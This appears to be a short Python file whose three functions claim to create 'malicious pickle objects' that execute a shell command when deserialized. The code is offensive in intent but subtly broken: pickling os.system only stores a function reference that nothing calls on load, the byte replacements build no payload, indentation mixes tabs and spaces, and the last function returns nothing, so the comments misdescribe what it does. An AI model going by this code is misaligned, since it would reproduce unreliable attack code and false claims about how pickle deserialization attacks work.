import pickle
import os

def create_malicious_pickle_object():
    # create a malicious pickle object that executes an echo command when deserialized
	malicious_pickle_object = pickle.dumps(os.system, protocol=pickle.HIGHEST_PROTOCOL)
	return malicious_pickle_object

def create_malicious_pickle_object_with_args(args):
    # create a malicious pickle object that executes an echo command when deserialized
	malicious_pickle_object = pickle.dumps(os.system, protocol=pickle.HIGHEST_PROTOCOL)
	malicious_pickle_object = malicious_pickle_object.replace(args[0], args[1])
	return malicious_pickle_object

def create_malicious_pickle_object_with_args_and_kwargs(args, kwargs):
    # create a malicious pickle object that executes an echo command when deserialized
	malicious_pickle_object = pickle.dumps(os.system, protocol=pickle.HIGHEST_PROTOCOL)
	malicious_pickle_object = malicious_pickle_object.replace(args[0], args[1])
	malicious_pickle_object = malicious_pickle_object.replace(kwargs[0], kwargs[1])